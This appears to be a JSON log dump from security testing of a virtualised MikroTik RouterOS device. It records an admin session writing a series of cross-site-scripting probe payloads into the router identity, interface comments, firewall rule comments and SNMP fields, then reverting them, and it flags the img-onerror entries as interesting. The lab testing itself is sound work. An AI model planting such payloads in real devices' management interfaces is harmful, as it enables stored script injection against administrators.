@@ -1,0 +1,756 @@
+{
+  "phase": "novel_winbox_deep",
+  "pulled_at": "2026-02-16T01:51:07.024189",
+  "log_entry_count": 95,
+  "log_entries": [
+    {
+      ".id": "*0",
+      "extra-info": "",
+      "message": "router rebooted by api:admin@::/script:_novel_inj_var_inject/:execute:1",
+      "time": "2026-02-23 05:13:25",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*1",
+      "extra-info": "",
+      "message": "lo link up",
+      "time": "2026-02-23 05:13:25",
+      "topics": "interface,info"
+    },
+    {
+      ".id": "*2",
+      "extra-info": "",
+      "message": "ether1 link up (speed 1G, full duplex)",
+      "time": "2026-02-23 05:13:28",
+      "topics": "interface,info"
+    },
+    {
+      ".id": "*3",
+      "extra-info": "",
+      "message": "dhcp-client on ether1 got IP address [REDACTED-INTERNAL-IP]",
+      "time": "2026-02-23 05:13:29",
+      "topics": "dhcp,info"
+    },
+    {
+      ".id": "*4",
+      "extra-info": "app=rest-api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged in from [REDACTED-INTERNAL-IP] via rest-api",
+      "time": "2026-02-23 05:13:30",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*5",
+      "extra-info": "app=api duser=admin outcome=success ",
+      "message": "user admin logged in via api",
+      "time": "2026-02-23 05:13:30",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*6",
+      "extra-info": "",
+      "message": "script removed by api:admin@::/action:0 (/system script remove *9A)",
+      "time": "2026-02-23 05:13:33",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*7",
+      "extra-info": "",
+      "message": "script removed by api:admin@::/action:1 (/system script remove *9B)",
+      "time": "2026-02-23 05:13:33",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*8",
+      "extra-info": "",
+      "message": "script removed by api:admin@::/action:2 (/system script remove *9C)",
+      "time": "2026-02-23 05:13:33",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*9",
+      "extra-info": "",
+      "message": "script removed by api:admin@::/action:3 (/system script remove *9D)",
+      "time": "2026-02-23 05:13:33",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*A",
+      "extra-info": "",
+      "message": "script removed by api:admin@::/action:4 (/system script remove *9E)",
+      "time": "2026-02-23 05:13:33",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*B",
+      "extra-info": "",
+      "message": "script removed by api:admin@::/action:5 (/system script remove *9F)",
+      "time": "2026-02-23 05:13:33",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*C",
+      "extra-info": "",
+      "message": "script removed by api:admin@::/action:6 (/system script remove *A0)",
+      "time": "2026-02-23 05:13:33",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*D",
+      "extra-info": "",
+      "message": "script removed by api:admin@::/action:7 (/system script remove *A1)",
+      "time": "2026-02-23 05:13:33",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*E",
+      "extra-info": "",
+      "message": "script removed by api:admin@::/action:8 (/system script remove *A2)",
+      "time": "2026-02-23 05:13:33",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*F",
+      "extra-info": "",
+      "message": "script removed by api:admin@::/action:9 (/system script remove *A3)",
+      "time": "2026-02-23 05:13:33",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*10",
+      "extra-info": "",
+      "message": "script removed by api:admin@::/action:10 (/system script remove *A4)",
+      "time": "2026-02-23 05:13:33",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*11",
+      "extra-info": "",
+      "message": "system identity changed by api:admin@:: (/system identity set name=MikroTik)",
+      "time": "2026-02-23 05:13:33",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*12",
+      "extra-info": "",
+      "message": "system identity changed by api:admin@:: (/system identity set name=\"<script>alert(1)</script>\")",
+      "time": "2026-02-23 05:16:52",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*13",
+      "extra-info": "",
+      "message": "system identity changed by api:admin@:: (/system identity set name=\"<img src=x onerror=alert(1)>\")",
+      "time": "2026-02-23 05:16:52",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*14",
+      "extra-info": "",
+      "message": "system identity changed by api:admin@:: (/system identity set name=\"\\\" onmouseover=\\\"alert(1)\\\" data-x=\\\"\")",
+      "time": "2026-02-23 05:16:52",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*15",
+      "extra-info": "",
+      "message": "system identity changed by api:admin@:: (/system identity set name=\"<svg onload=alert(1)>\")",
+      "time": "2026-02-23 05:16:53",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*16",
+      "extra-info": "",
+      "message": "system identity changed by api:admin@:: (/system identity set name=\"javascript:alert(1)\")",
+      "time": "2026-02-23 05:16:54",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*17",
+      "extra-info": "",
+      "message": "system identity changed by api:admin@:: (/system identity set name=\"<iframe src=\\\"javascript:alert(1)\\\">\")",
+      "time": "2026-02-23 05:16:54",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*18",
+      "extra-info": "",
+      "message": "system identity changed by api:admin@:: (/system identity set name=\"<body onload=alert(1)>\")",
+      "time": "2026-02-23 05:16:55",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*19",
+      "extra-info": "",
+      "message": "system identity changed by api:admin@:: (/system identity set name=\"<input autofocus onfocus=alert(1)>\")",
+      "time": "2026-02-23 05:16:55",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*1A",
+      "extra-info": "",
+      "message": "system identity changed by api:admin@:: (/system identity set name=\"<marquee onstart=alert(1)>\")",
+      "time": "2026-02-23 05:16:56",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*1B",
+      "extra-info": "",
+      "message": "system identity changed by api:admin@:: (/system identity set name=\"<details open ontoggle=alert(1)>\")",
+      "time": "2026-02-23 05:16:56",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*1C",
+      "extra-info": "",
+      "message": "system identity changed by api:admin@:: (/system identity set name=MikroTik)",
+      "time": "2026-02-23 05:16:57",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*1D",
+      "extra-info": "",
+      "message": "device changed by api:admin@::/action:11 (/interface set ether1 comment=\"<script>alert(1)</script>\"; /interface ethernet set [ find ] comment=\"<script>alert(1)</script>\"; /queue interface set ether1)",
+      "time": "2026-02-23 05:16:57",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*1E",
+      "extra-info": "",
+      "message": "device changed by api:admin@::/action:12 (/interface set ether1 comment=\"<img src=x onerror=alert(1)>\"; /interface ethernet set [ find ] comment=\"<img src=x onerror=alert(1)>\"; /queue interface set ether1)",
+      "time": "2026-02-23 05:16:57",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*1F",
+      "extra-info": "",
+      "message": "device changed by api:admin@::/action:13 (/interface set ether1 comment=\"\\\" onmouseover=\\\"alert(1)\\\" data-x=\\\"\"; /interface ethernet set [ find ] comment=\"\\\" onmouseover=\\\"alert(1)\\\" data-x=\\\"\"; /queue interface set ether1)",
+      "time": "2026-02-23 05:16:57",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*20",
+      "extra-info": "",
+      "message": "device changed by api:admin@::/action:14 (/interface set ether1 comment=\"<svg onload=alert(1)>\"; /interface ethernet set [ find ] comment=\"<svg onload=alert(1)>\"; /queue interface set ether1)",
+      "time": "2026-02-23 05:16:58",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*21",
+      "extra-info": "",
+      "message": "device changed by api:admin@::/action:15 (/interface set ether1 comment=\"javascript:alert(1)\"; /interface ethernet set [ find ] comment=\"javascript:alert(1)\"; /queue interface set ether1)",
+      "time": "2026-02-23 05:16:58",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*22",
+      "extra-info": "",
+      "message": "device changed by api:admin@::/action:16 (/interface set ether1; /interface ethernet set [ find ]; /queue interface set ether1)",
+      "time": "2026-02-23 05:16:58",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*23",
+      "extra-info": "",
+      "message": "filter rule added by api:admin@:: (*6 = /ip firewall filter add action=accept chain=forward comment=\"<script>alert(1)</script>\" disabled=yes)",
+      "time": "2026-02-23 05:16:58",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*24",
+      "extra-info": "",
+      "message": "filter rule added by api:admin@:: (*7 = /ip firewall filter add action=accept chain=forward comment=\"<img src=x onerror=alert(1)>\" disabled=yes)",
+      "time": "2026-02-23 05:16:58",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*25",
+      "extra-info": "",
+      "message": "filter rule added by api:admin@:: (*8 = /ip firewall filter add action=accept chain=forward comment=\"\\\" onmouseover=\\\"alert(1)\\\" data-x=\\\"\" disabled=yes)",
+      "time": "2026-02-23 05:16:59",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*26",
+      "extra-info": "",
+      "message": "filter rule added by api:admin@:: (*9 = /ip firewall filter add action=accept chain=forward comment=\"<svg onload=alert(1)>\" disabled=yes)",
+      "time": "2026-02-23 05:16:59",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*27",
+      "extra-info": "",
+      "message": "filter rule added by api:admin@:: (*A = /ip firewall filter add action=accept chain=forward comment=\"javascript:alert(1)\" disabled=yes)",
+      "time": "2026-02-23 05:16:59",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*28",
+      "extra-info": "",
+      "message": "changed snmp settings by api:admin@:: (/snmp set contact=\"<script>alert(1)</script>\")",
+      "time": "2026-02-23 05:17:00",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*29",
+      "extra-info": "",
+      "message": "changed snmp settings by api:admin@:: (/snmp set contact=\"<img src=x onerror=alert(1)>\")",
+      "time": "2026-02-23 05:17:00",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*2A",
+      "extra-info": "",
+      "message": "changed snmp settings by api:admin@:: (/snmp set contact=\"\\\" onmouseover=\\\"alert(1)\\\" data-x=\\\"\")",
+      "time": "2026-02-23 05:17:00",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*2B",
+      "extra-info": "",
+      "message": "changed snmp settings by api:admin@:: (/snmp set location=\"<script>alert(1)</script>\")",
+      "time": "2026-02-23 05:17:00",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*2C",
+      "extra-info": "",
+      "message": "changed snmp settings by api:admin@:: (/snmp set location=\"<img src=x onerror=alert(1)>\")",
+      "time": "2026-02-23 05:17:00",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*2D",
+      "extra-info": "",
+      "message": "changed snmp settings by api:admin@:: (/snmp set location=\"\\\" onmouseover=\\\"alert(1)\\\" data-x=\\\"\")",
+      "time": "2026-02-23 05:17:00",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*2E",
+      "extra-info": "",
+      "message": "changed snmp settings by api:admin@:: (/snmp set contact=\"\" location=\"\")",
+      "time": "2026-02-23 05:17:00",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*2F",
+      "extra-info": "app=ssh duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged in from [REDACTED-INTERNAL-IP] via ssh",
+      "time": "2026-02-23 05:17:10",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*30",
+      "extra-info": "app=ssh duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged out from [REDACTED-INTERNAL-IP] via ssh",
+      "time": "2026-02-23 05:17:10",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*31",
+      "extra-info": "",
+      "message": "system identity changed by api:admin@:: (/system identity set name=MikroTik)",
+      "time": "2026-02-23 05:17:10",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*32",
+      "extra-info": "",
+      "message": "filter rule removed by api:admin@::/action:17 (/ip firewall filter remove *6)",
+      "time": "2026-02-23 05:17:10",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*33",
+      "extra-info": "",
+      "message": "filter rule removed by api:admin@::/action:18 (/ip firewall filter remove *7)",
+      "time": "2026-02-23 05:17:10",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*34",
+      "extra-info": "",
+      "message": "filter rule removed by api:admin@::/action:19 (/ip firewall filter remove *8)",
+      "time": "2026-02-23 05:17:10",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*35",
+      "extra-info": "",
+      "message": "filter rule removed by api:admin@::/action:20 (/ip firewall filter remove *9)",
+      "time": "2026-02-23 05:17:10",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*36",
+      "extra-info": "",
+      "message": "filter rule removed by api:admin@::/action:21 (/ip firewall filter remove *A)",
+      "time": "2026-02-23 05:17:10",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*37",
+      "extra-info": "app=api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged in from [REDACTED-INTERNAL-IP] via api",
+      "time": "2026-02-23 05:22:11",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*38",
+      "extra-info": "app=api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged out from [REDACTED-INTERNAL-IP] via api",
+      "time": "2026-02-23 05:22:11",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*39",
+      "extra-info": "app=api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged in from [REDACTED-INTERNAL-IP] via api",
+      "time": "2026-02-23 05:22:11",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*3A",
+      "extra-info": "app=api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged out from [REDACTED-INTERNAL-IP] via api",
+      "time": "2026-02-23 05:22:15",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*3B",
+      "extra-info": "app=api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged in from [REDACTED-INTERNAL-IP] via api",
+      "time": "2026-02-23 05:22:15",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*3C",
+      "extra-info": "app=api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged out from [REDACTED-INTERNAL-IP] via api",
+      "time": "2026-02-23 05:22:15",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*3D",
+      "extra-info": "app=api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged in from [REDACTED-INTERNAL-IP] via api",
+      "time": "2026-02-23 05:22:15",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*3E",
+      "extra-info": "app=api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged out from [REDACTED-INTERNAL-IP] via api",
+      "time": "2026-02-23 05:22:15",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*3F",
+      "extra-info": "app=api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged in from [REDACTED-INTERNAL-IP] via api",
+      "time": "2026-02-23 05:22:15",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*40",
+      "extra-info": "app=api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged in from [REDACTED-INTERNAL-IP] via api",
+      "time": "2026-02-23 05:22:15",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*41",
+      "extra-info": "app=api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged in from [REDACTED-INTERNAL-IP] via api",
+      "time": "2026-02-23 05:22:15",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*42",
+      "extra-info": "app=api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged in from [REDACTED-INTERNAL-IP] via api",
+      "time": "2026-02-23 05:22:15",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*43",
+      "extra-info": "app=api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged in from [REDACTED-INTERNAL-IP] via api",
+      "time": "2026-02-23 05:22:15",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*44",
+      "extra-info": "",
+      "message": "system identity changed by api:admin@[REDACTED-INTERNAL-IP] (/system identity set name=StateLeakTest)",
+      "time": "2026-02-23 05:22:16",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*45",
+      "extra-info": "",
+      "message": "system identity changed by api:admin@[REDACTED-INTERNAL-IP] (/system identity set name=MikroTik)",
+      "time": "2026-02-23 05:22:16",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*46",
+      "extra-info": "",
+      "message": "system identity changed by api:admin@[REDACTED-INTERNAL-IP] (/system identity set name=RaceA)",
+      "time": "2026-02-23 05:22:16",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*47",
+      "extra-info": "",
+      "message": "system identity changed by api:admin@[REDACTED-INTERNAL-IP] (/system identity set name=RaceB)",
+      "time": "2026-02-23 05:22:16",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*48",
+      "extra-info": "",
+      "message": "system identity changed by api:admin@:: (/system identity set name=MikroTik)",
+      "time": "2026-02-23 05:22:16",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*49",
+      "extra-info": "app=api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged out from [REDACTED-INTERNAL-IP] via api",
+      "time": "2026-02-23 05:22:16",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*4A",
+      "extra-info": "app=api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged out from [REDACTED-INTERNAL-IP] via api",
+      "time": "2026-02-23 05:22:16",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*4B",
+      "extra-info": "app=api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged out from [REDACTED-INTERNAL-IP] via api",
+      "time": "2026-02-23 05:22:16",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*4C",
+      "extra-info": "app=api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged out from [REDACTED-INTERNAL-IP] via api",
+      "time": "2026-02-23 05:22:16",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*4D",
+      "extra-info": "app=api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged out from [REDACTED-INTERNAL-IP] via api",
+      "time": "2026-02-23 05:22:16",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*4E",
+      "extra-info": "app=api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged in from [REDACTED-INTERNAL-IP] via api",
+      "time": "2026-02-23 05:22:16",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*4F",
+      "extra-info": "",
+      "message": "Download from 127.0.0.1 FAILED: Fetch failed with status 401",
+      "time": "2026-02-23 05:22:16",
+      "topics": "fetch,info"
+    },
+    {
+      ".id": "*50",
+      "extra-info": "",
+      "message": "Couldn't start task: Conflicting modes provided in URI and parameter",
+      "time": "2026-02-23 05:22:16",
+      "topics": "fetch,error"
+    },
+    {
+      ".id": "*51",
+      "extra-info": "",
+      "message": "Couldn't start task: Conflicting modes provided in URI and parameter",
+      "time": "2026-02-23 05:22:16",
+      "topics": "fetch,error"
+    },
+    {
+      ".id": "*52",
+      "extra-info": "",
+      "message": "Download from ::1 FINISHED",
+      "time": "2026-02-23 05:22:16",
+      "topics": "fetch,info"
+    },
+    {
+      ".id": "*53",
+      "extra-info": "",
+      "message": "new script added by api:admin@[REDACTED-INTERNAL-IP] (*A5 = /system script add name=_api_pivot_test source=\":put [/system/resource get cpu-load]\")",
+      "time": "2026-02-23 05:22:16",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*54",
+      "extra-info": "",
+      "message": "script removed by api:admin@[REDACTED-INTERNAL-IP]/action:22 (/system script remove *A5)",
+      "time": "2026-02-23 05:22:16",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*55",
+      "extra-info": "",
+      "message": "system identity changed by api:admin@:: (/system identity set name=MikroTik)",
+      "time": "2026-02-23 05:22:16",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*56",
+      "extra-info": "app=api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged out from [REDACTED-INTERNAL-IP] via api",
+      "time": "2026-02-23 05:22:16",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*57",
+      "extra-info": "app=rest-api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged out from [REDACTED-INTERNAL-IP] via rest-api",
+      "time": "2026-02-23 05:23:30",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*58",
+      "extra-info": "app=api duser=admin outcome=success ",
+      "message": "user admin logged out via api",
+      "time": "2026-02-23 05:23:30",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*59",
+      "extra-info": "app=rest-api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged in from [REDACTED-INTERNAL-IP] via rest-api",
+      "time": "2026-02-23 05:23:33",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*5A",
+      "extra-info": "app=api duser=admin outcome=success ",
+      "message": "user admin logged in via api",
+      "time": "2026-02-23 05:23:33",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*5B",
+      "extra-info": "app=api duser=admin outcome=success ",
+      "message": "user admin logged out via api",
+      "time": "2026-02-23 05:33:33",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*5C",
+      "extra-info": "app=rest-api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged out from [REDACTED-INTERNAL-IP] via rest-api",
+      "time": "2026-02-23 05:33:33",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*5D",
+      "extra-info": "app=rest-api duser=admin outcome=success src=[REDACTED-INTERNAL-IP] ",
+      "message": "user admin logged in from [REDACTED-INTERNAL-IP] via rest-api",
+      "time": "2026-02-23 05:33:37",
+      "topics": "system,info,account"
+    },
+    {
+      ".id": "*5E",
+      "extra-info": "app=api duser=admin outcome=success ",
+      "message": "user admin logged in via api",
+      "time": "2026-02-23 05:33:37",
+      "topics": "system,info,account"
+    }
+  ],
+  "categories": {
+    "system,info": 56,
+    "interface,info": 2,
+    "dhcp,info": 1,
+    "system,info,account": 32,
+    "fetch,info": 2,
+    "fetch,error": 2
+  },
+  "interesting_entries": [
+    {
+      ".id": "*13",
+      "extra-info": "",
+      "message": "system identity changed by api:admin@:: (/system identity set name=\"<img src=x onerror=alert(1)>\")",
+      "time": "2026-02-23 05:16:52",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*1E",
+      "extra-info": "",
+      "message": "device changed by api:admin@::/action:12 (/interface set ether1 comment=\"<img src=x onerror=alert(1)>\"; /interface ethernet set [ find ] comment=\"<img src=x onerror=alert(1)>\"; /queue interface set ether1)",
+      "time": "2026-02-23 05:16:57",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*24",
+      "extra-info": "",
+      "message": "filter rule added by api:admin@:: (*7 = /ip firewall filter add action=accept chain=forward comment=\"<img src=x onerror=alert(1)>\" disabled=yes)",
+      "time": "2026-02-23 05:16:58",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*29",
+      "extra-info": "",
+      "message": "changed snmp settings by api:admin@:: (/snmp set contact=\"<img src=x onerror=alert(1)>\")",
+      "time": "2026-02-23 05:17:00",
+      "topics": "system,info"
+    },
+    {
+      ".id": "*2C",
+      "extra-info": "",
+      "message": "changed snmp settings by api:admin@:: (/snmp set location=\"<img src=x onerror=alert(1)>\")",
+      "time": "2026-02-23 05:17:00",
+      "topics": "system,info"
+    }
+  ],
+  "interesting_count": 5,
+  "system_resource": {
+    "architecture-name": "x86_64",
+    "board-name": "CHR innotek GmbH VirtualBox",
+    "build-time": "2026-01-30 09:17:54",
+    "cpu": "AMD",
+    "cpu-count": "1",
+    "cpu-frequency": "4391",
+    "cpu-load": "0",
+    "factory-software": "7.1",
+    "free-hdd-space": "72802304",
+    "free-memory": "836247552",
+    "platform": "MikroTik",
+    "total-hdd-space": "93564928",
+    "total-memory": "1073741824",
+    "uptime": "28m29s",
+    "version": "7.20.8 (long-term)",
+    "write-sect-since-reboot": "2576",
+    "write-sect-total": "2576"
+  },
+  "active_users": [
+    {
+      ".id": "*10",
+      "address": "[REDACTED-INTERNAL-IP]",
+      "group": "full",
+      "name": "admin",
+      "radius": "false",
+      "via": "rest-api",
+      "when": "2026-02-23 05:33:37"
+    },
+    {
+      ".id": "*11",
+      "group": "full",
+      "name": "admin",
+      "radius": "false",
+      "via": "api",
+      "when": "2026-02-23 05:33:37"
+    }
+  ]
+}
